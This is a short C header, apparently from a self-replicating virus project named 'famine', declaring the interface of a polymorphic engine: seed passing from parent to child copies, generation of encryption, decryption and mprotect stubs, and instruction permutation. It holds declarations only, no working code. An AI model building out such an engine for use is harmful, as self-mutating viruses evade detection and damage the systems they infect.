#ifndef POLYMORPHISM_H
# define POLYMORPHISM_H

# include <stdbool.h>
# include <stdint.h>
# include <stddef.h>

# include "famine.h"

bool		yield_seed_to_heir(uint64_t father_seed[2], uint64_t son_seed[2]);

bool		generate_cypher(char *buffer, uint64_t seed, size_t size);
bool		generate_decypher(char *buffer, uint64_t seed, size_t size);
bool 		generate_mprotect(char *buffer, uint64_t seed, size_t size);

bool		permutate_instructions(void *buffer, uint64_t seed, size_t size);

bool 		generate_mprotect(char *buffer, uint64_t seed, size_t size);
#endif
